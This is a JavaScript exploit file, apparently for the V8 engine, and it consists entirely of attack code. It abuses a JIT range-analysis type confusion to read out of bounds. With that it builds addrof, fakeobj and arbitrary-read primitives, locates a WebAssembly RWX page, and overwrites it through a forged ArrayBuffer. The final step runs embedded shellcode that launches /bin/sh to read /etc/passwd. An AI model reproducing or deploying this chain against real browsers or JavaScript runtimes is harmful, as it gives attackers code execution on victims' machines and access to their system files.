cvt_buf = new ArrayBuffer(8);
cvt_f64a = new Float64Array(cvt_buf);
cvt_u64a = new BigUint64Array(cvt_buf);
cvt_u32a = new Uint32Array(cvt_buf);


function ftoi(f) { // float -> bigint
  cvt_f64a[0] = f;
  return cvt_u64a[0];
 }

function itof(i) { // bigint -> float
  cvt_u64a[0] = i;
  return cvt_f64a[0];
 }
 
function lower(i) {
    return Number(i % (2n**32n));
}
function upper(i) {
    return Number(i / (2n**32n));
}
function pair(h,l) {
    return BigInt(h) * (2n**32n) + BigInt(l);
}



function leak_array_map(arg_true, a, obj) {
    // leaks the address of the map corresponding to an array with double-typed elements
    // as well as the map for its element storage
    
    let o = {c0: 0, cf: false};
    let x = ((a&5)==2)|0;
    let y = ((a&6)==1)|0;
    
    "a"[x];"a"[y]; 

    x = x + (o.cf ? "" : (2**30) - (o.c0&1)) - (2**30);
    y = y + (o.cf ? "" : (2**30) - (o.c0&1)) - (2**30);
    
    x = Math.min(2**32-1, x + (2**32-1)) - (2**32-1); 
    y = Math.min(2**32-1, y + (2**32-1)) - (2**32-1);
    let confused = Math.max(-1,x & y); 
    confused = Math.max(-1, confused); 
    confused = ((0-confused)>>31); 


    let arr = new Array(3+30*(1+confused));
    arr[0] = 1e64; // make sure arr is of type double
    arr[1] = 2e64;
    let arr2 = new Array(10);//[1337.5, 1338.5, 1339.5]; // arr2 is of type double too
    for (var i = 0; i < 10; i++) arr2[i] = i+1337.5;
    let iter = arr[Symbol.iterator]();
    // skip elements of arr:
    iter.next();iter.next();iter.next();

    // at header of arr2 elements (need 1 skip as arr is 64-bit sized):
    let v0 = iter.next();
    // skip elements of arrw (need 3 skips as arr and arrw both have 64-bit elements):
    iter.next();iter.next();iter.next();iter.next();iter.next();iter.next();iter.next();iter.next();iter.next();iter.next();    
    
    // at header of arr2 object:
    let v1 = iter.next();

    return [v0.value, v1.value, arr2];

}



function leak_addr_helper(arg_true, a, obj) { 

    let o = {c0: 0, cf: false};
    let x = ((a&5)==2)|0;
    let y = ((a&6)==1)|0;
    
    "a"[x];"a"[y]; // generate CheckBounds()

    x = x + (o.cf ? "" : (2**30) - (o.c0&1)) - (2**30); // type is Range(-1,0), but only after LoadElimination
    y = y + (o.cf ? "" : (2**30) - (o.c0&1)) - (2**30);
    
    x = Math.min(2**32-1, x + (2**32-1)) - (2**32-1); // type is Range(-1,0) already during Typer
    y = Math.min(2**32-1, y + (2**32-1)) - (2**32-1);
    let confused = Math.max(-1,x & y); // type is Range(..., 0), really is 1
    confused = Math.max(-1, confused); // type is Range(-1, 0), really is 1
    confused = ((0-confused)>>31); // type is Range(0, 0), really is -1


    let arr = new Array(3+30*(1+confused));
    arr[0] = 0.5; // make sure arr is of type double
    let arr2 = new Array(5);    for (var idx = 0; idx < 5; idx+=1) arr2[idx]={}; // make sure arr2 is of type smi/object
    arr2[1] = obj;
    arr2[0] = 0x1337;

    let iter = arr[Symbol.iterator]();
    
    // skip elements of arr:
    iter.next();iter.next();iter.next();

    // skip over next array's header (nead one skip as arr is 64-bit sized):
    iter.next();

    let v1 = iter.next().value;

    return v1;

}


function fake_obj_helper(arg_true, a, val) { 
    let o = {c0: 0, cf: false};
    let x = ((a&5)==2)|0;
    let y = ((a&6)==1)|0;
    
    "a"[x];"a"[y]; // generate CheckBounds()

    x = x + (o.cf ? "" : (2**30) - (o.c0&1)) - (2**30); // type is Range(-1,0), but only after LoadElimination
    y = y + (o.cf ? "" : (2**30) - (o.c0&1)) - (2**30);
    
    x = Math.min(2**32-1, x + (2**32-1)) - (2**32-1); // type is Range(-1,0) already during Typer
    y = Math.min(2**32-1, y + (2**32-1)) - (2**32-1);
    let confused = Math.max(-1,x & y); // type is Range(..., 0), really is 1
    confused = Math.max(-1, confused); // type is Range(-1, 0), really is 1
    confused = ((0-confused)>>31); // type is Range(0, 0), really is -1

    let arr = new Array(3+30*(1+confused));
    arr[0] = 0; // make aure we are a smi/object-array
    let arr2 = new Array(5);    for (var idx = 0; idx < 5; idx+=1) arr2[idx]=0.0; // make sure arr2 is a double-typed array
    
    arr2[0] = val;

    let iter = arr[Symbol.iterator]();
    
    // skip elements of arr:
    iter.next();iter.next();iter.next();
    // skip over arr2's header (need two skips as arr is 32-bit sized):
    iter.next();iter.next();
    // read first half of arr2[0] contents:
    let v1 = iter.next();

    return v1.value;

}





for (i=0; i < 10**5; i+=1) fake_obj_helper(true, 3, 2.567347528655259e-289);
fake_obj_helper(true, 3, 1.2132797677859895e-279);

let obj = new Array(128);
for (i=0; i < 10**5; i+=1) leak_addr_helper(true, 3, obj);


let arr = new Array(128);
for (i=0; i < 10**5; i+=1) leak_array_map(true, 3, arr);
var res = leak_array_map(true, 3, arr);
let elems_map_leak = res[0];
let array_map_leak = res[1];
console.log("elems_map_leak = 0x" + (ftoi(res[0])).toString(16) + " | " + res[0]);
console.log("array_map_leak = 0x" + (ftoi(res[1])).toString(16) + " | "  +res[1]);



function addrof(obj) {
    // gets the address (as a tagged, compressed pointer) of any object
    let f = leak_addr_helper(true, 3, obj);
    let n = ftoi(f);
    let u = upper(n);
    let l = lower(n);
    if (l != (0x1337 << 1)) console.log("lower doesn't match expected!");
    return u;
}




function fakeobj(addr) {
    // given a tagged, compressed pointer, return the fake object at that place
    let f = itof(pair(addr,addr));
    return fake_obj_helper(true, 3, f);
}


let foo_arr = [0.0, 1.1, 2.2, 3.3, 4.4];
let foo_content_addr = addrof(foo_arr) + 32;
console.log(foo_content_addr.toString(16))
let rw_arr = [itof(pair(0x13371337,0x13371337)),1.1,0.0,array_map_leak,60.0,itof(pair(1000,1000))];
let rw_arr_addr = addrof(rw_arr);
let rw_arr_content_addr = rw_arr_addr + 32;
rw_arr[4] = itof(pair(50, rw_arr_content_addr));
rw_arr[4] = itof(pair(50, rw_arr_content_addr));
let r = fakeobj(rw_arr_content_addr + 8*3); // create another array, overlapping rw_arr

function arbread64(addr) { 
    rw_arr[4] = itof(pair(50, addr-8));
    return ftoi(r[0]);
}





let wasm_code = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x08, 0x02, 0x60, 0x01, 0x7f, 0x00, 0x60, 0x00, 0x00, 0x02, 0x19, 0x01, 0x07, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x73, 0x0d, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x00, 0x00, 0x03, 0x02, 0x01, 0x01, 0x07, 0x11, 0x01, 0x0d, 0x65, 0x78, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x00, 0x01, 0x0a, 0x08, 0x01, 0x06, 0x00, 0x41, 0x2a, 0x10, 0x00, 0x0b]);
let wasm_module = new WebAssembly.Module(wasm_code);

let importObject = {
    imports: {
        imported_func: () => {
            console.log("wasm overwrite unsuccessful :(");
        }
    }
}


let wasm_instance = new WebAssembly.Instance(wasm_module, importObject);
let wasm_instance_addr = addrof(wasm_instance);
let rwx_page = arbread64(wasm_instance_addr+13*8);

console.log("wasm @ 0x" + wasm_instance_addr.toString(16));
console.log("rwx_page @ 0x" + (rwx_page).toString(16));






// make sure that length(sc) is divisible by 4
let sc = new Uint8Array([144, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 99, 104, 111, 46, 114, 105, 1, 72, 49, 4, 36, 72, 137, 231, 104, 118, 101, 1, 1, 129, 52, 36, 1, 1, 1, 1, 72, 184, 101, 116, 99, 47, 112, 97, 115, 115, 80, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 44, 98, 1, 98, 96, 117, 33, 46, 72, 49, 4, 36, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 99, 104, 111, 46, 114, 105, 1, 72, 49, 4, 36, 49, 246, 86, 106, 19, 94, 72, 1, 230, 86, 106, 24, 94, 72, 1, 230, 86, 106, 24, 94, 72, 1, 230, 86, 72, 137, 230, 49, 210, 106, 59, 88, 15, 5]); // sample shellcode: execve("/bin/sh",["/bin/sh","-c","cat /etc/passwd"])
let sc32 = new Uint32Array(sc.buffer);


let helper_array = new Uint32Array(16);
let helper_array_addr = addrof(helper_array);
let helper_array_content = helper_array_addr - 16*4; // actual contents of fake_obj_buf


let ref_buf = new ArrayBuffer(0x400); // "reference" ArrayBuffer object to get map addreses and stuff
let ref_buf_addr = addrof(ref_buf);

let buf0 = arbread64(ref_buf_addr);
let buf1 = arbread64(ref_buf_addr+8);

helper_array[0] = lower(buf0); // just copy map information
helper_array[1] = upper(buf0);
helper_array[2] = lower(buf1);
helper_array[3] = 1337; // length
helper_array[4] = 0;
helper_array[5] = 1337;
helper_array[6] = 0;
helper_array[7] = lower(rwx_page); // change the backing store to rwx_page
helper_array[8] = upper(rwx_page);



print("fake arr buf @ " + (helper_array_content).toString(16));
let fake_buf = fakeobj(helper_array_content);





let dataview = new DataView(fake_buf);
for (var i = 0; i < sc32.length;i++){
    dataview.setUint32(4*i, sc32[i], true); // write shellcode to rwx page
}
wasm_instance.exports.exported_func();

